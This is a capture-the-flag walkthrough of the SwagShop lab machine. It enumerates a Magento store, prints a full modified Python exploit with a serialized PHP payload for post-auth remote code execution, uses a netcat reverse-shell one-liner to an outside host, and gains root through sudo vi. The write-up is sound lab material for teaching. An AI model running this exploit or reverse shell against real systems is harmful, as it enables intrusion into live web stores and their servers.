Ping
![[Pasted image 20240704161528.png]]

Nmap Scans
```
mapit 10.10.10.140
```

Nmap Default Scan
![[Pasted image 20240704161610.png]]

Nmap Service and Script Scan
![[Pasted image 20240704161751.png]]

Nmap All Port Scan
![[Pasted image 20240704161937.png]]

Have changed added swagshop.htb to my hosts file
![[Pasted image 20240704162143.png]]

On Port 80 http://swagshop.htb/
![[Pasted image 20240704161912.png]]

Gobuster Scan
```
gobuster dir -u http://10.10.10.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt
```
![[Pasted image 20240704162622.png]]

 I have found this in /app dir
![[Pasted image 20240704165349.png]]
I think it is mysql cred, but we can't reach mysql server from outside

We can see the website is running Magento Copyrighted at 20145, so it should be older version
![[Pasted image 20240704163145.png]]

Will check for public exploit and there are lot will use this https://github.com/joren485/Magento-Shoplift-SQLI

Have saved the code in file named exp.py and executed
```
python2 exp.py http://swagshop.htb
```
![[Pasted image 20240704164255.png]]

But we can't get the admin page with this url, instead we have to add index.php 
http://swagshop.htb/index.php/admin
![[Pasted image 20240704164414.png]]

Will login using the password provided by the exploit code ypwq:123

We got admin dashboard   
![[Pasted image 20240704165400.png]]

And found another exploit for this version but it is authenticated RCE https://www.exploit-db.com/exploits/37811
Saved the script in the file named exp1.py and executed
```
python2 exp1.py http://10.10.10.140 "id"
```
![[Pasted image 20240704165739.png]]

I have check the code and found the problematic area and commented it.
![[Pasted image 20240704165945.png]]

This script need a tons of modification, the below is modified Exploit Script for RCE
```
#!/usr/bin/python
# Exploit Title: Magento CE < 1.9.0.1 Post Auth RCE
# Google Dork: "Powered by Magento"
# Date: 08/18/2015
# Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com
# Vendor Homepage: http://magento.com/
# Software Link: https://www.magentocommerce.com/download
# Version: 1.9.0.1 and below
# Tested on: Ubuntu 15
# CVE : none

from hashlib import md5
import sys
import re
import base64
import requests

def usage():
    print("Usage: python %s <target> <argument>\nExample: python %s http://localhost \"uname -a\"" % (sys.argv[0], sys.argv[0]))
    sys.exit()

if len(sys.argv) != 3:
    usage()

# Command-line args
target = sys.argv[1]
arg = sys.argv[2]

# Config.
username = 'ypwq'
password = '123'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml

# POP chain to pivot into call_user_exec
payload = (
    'O:8:"Zend_Log":1:{s:11:"\00*\00_writers";a:2:{i:0;O:20:"Zend_Log_Writer_Mail":4:{s:16:'
    '"\00*\00_eventsToMail";a:3:{i:0;s:11:"EXTERMINATE";i:1;s:12:"EXTERMINATE!";i:2;s:15:"'
    'EXTERMINATE!!!!";}s:22:"\00*\00_subjectPrependText";N;s:10:"\00*\00_layout";O:23:"'
    'Zend_Config_Writer_Yaml":3:{s:15:"\00*\00_yamlEncoder";s:%d:"%s";s:17:"\00*\00'
    '_loadedSection";N;s:10:"\00*\00_config";O:13:"Varien_Object":1:{s:8:"\00*\00_data"'
    ';s:%d:"%s";}}s:8:"\00*\00_mail";O:9:"Zend_Mail":0:{}}i:1;i:2;}}' % 
    (len(php_function), php_function, len(arg), arg)
)

s = requests.session()
data = {
    'login[username]': username,
    'login[password]': password,
    'form_key': '6I8iRr8WcOtoVnpU',
    'dummy': ''
}

res = s.post(target, data=data)
content = res.content

url = re.search("ajaxBlockUrl = \'(.*)\'", content)
url = url.group(1)

key = re.search("var FORM_KEY = '(.*)'", content)
key = key.group(1)

data = {'isAjax': 'false', 'form_key': key}
request = s.post(url + 'block/tab_orders/period/2y/?isAjax=true', data=data)
res = request.content

tunnel = re.search("src=\"(.*)\?ga=", request.content)
tunnel = tunnel.group(1)

payload = base64.b64encode(payload.encode()).decode()
gh = md5((payload + install_date).encode()).hexdigest()

exploit = tunnel + '?ga=' + payload + '&h=' + gh
req = s.get(exploit)
print(req.content)

```

Will Jump to Initial Foothold...!




Will execute this exploit and it was saved in a file named exp1.py
```
python2 exp1.py http://10.10.10.140/index.php/admin "id"
```
![[Pasted image 20240706132324.png]]

Will get a reverse shell now, 
```
python2 exp1.py http://10.10.10.140/index.php/admin "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.3 4444 >/tmp/f"
```
![[Pasted image 20240706133102.png]]
Got it....!

**User.txt**
![[Pasted image 20240706133639.png]]


Will Jump to Privilege Escalation....!

Will check our Privilege
```
sudo -l
```
![[Pasted image 20240706133908.png]]
We have wildcard, will enumerate further

we can use this privilege to become root
```
sudo /usr/bin/vi /var/www/html/pwn
```
This will open a file as root in vi

Then will get a shell as root using Vi
```
:set shell=/bin/sh 
```
```
:shell
```
![[Pasted image 20240706135613.png]]
Got root shell, will get a new shell as root, I don't like this shell

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.3 4444 >/tmp/f
```
![[Pasted image 20240706135710.png]]

Got new Shell as root
![[Pasted image 20240706135732.png]]

**Root.txt**
![[Pasted image 20240706135810.png]]



Done with Swagshop.......:) 